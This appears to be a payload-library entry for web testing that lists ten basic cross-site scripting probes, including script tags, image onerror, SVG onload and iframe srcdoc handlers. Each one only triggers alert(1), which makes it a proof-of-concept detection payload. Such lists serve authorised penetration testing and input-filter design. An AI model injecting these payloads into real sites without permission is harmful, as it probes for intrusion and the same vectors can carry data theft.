---
id: "xss-basic-payloads"
title: "XSS Payloads - Basic XSS Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "basic", "payload"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Simple, commonly used XSS payloads for initial testing

## Payloads

### Basic Alert

Most basic XSS payload using script tags

- **Contexts**: html
- **Severity**: high

```html
<script>alert(1)</script>
```

### Image OnError

Uses image tag with onerror event handler

- **Contexts**: html
- **Severity**: high

```html
<img src=x onerror=alert(1)>
```

### SVG OnLoad

SVG element with onload event

- **Contexts**: html
- **Severity**: high

```html
<svg onload=alert(1)>
```

### Input AutoFocus

Input element that automatically focuses and triggers XSS

- **Contexts**: html
- **Severity**: high

```html
<input autofocus onfocus=alert(1)>
```

### Body OnLoad

Body tag with onload event handler

- **Contexts**: html
- **Severity**: high

```html
<body onload=alert(1)>
```

### Iframe SrcDoc

Iframe with embedded HTML in srcdoc attribute

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

### Details/Summary

HTML5 details element with ontoggle event

- **Contexts**: html
- **Severity**: high

```html
<details ontoggle=alert(1)><summary>Click me</summary></details>
```

### Video OnError

Video element with onerror handler

- **Contexts**: html
- **Severity**: high

```html
<video><source onerror=alert(1)></video>
```

### Marquee OnStart

Marquee element with onstart event

- **Contexts**: html
- **Severity**: medium

```html
<marquee onstart=alert(1)>XSS</marquee>
```

### Form OnSubmit

Form with onsubmit event handler

- **Contexts**: html
- **Severity**: high

```html
<form onsubmit=alert(1)><input type=submit></form>
```
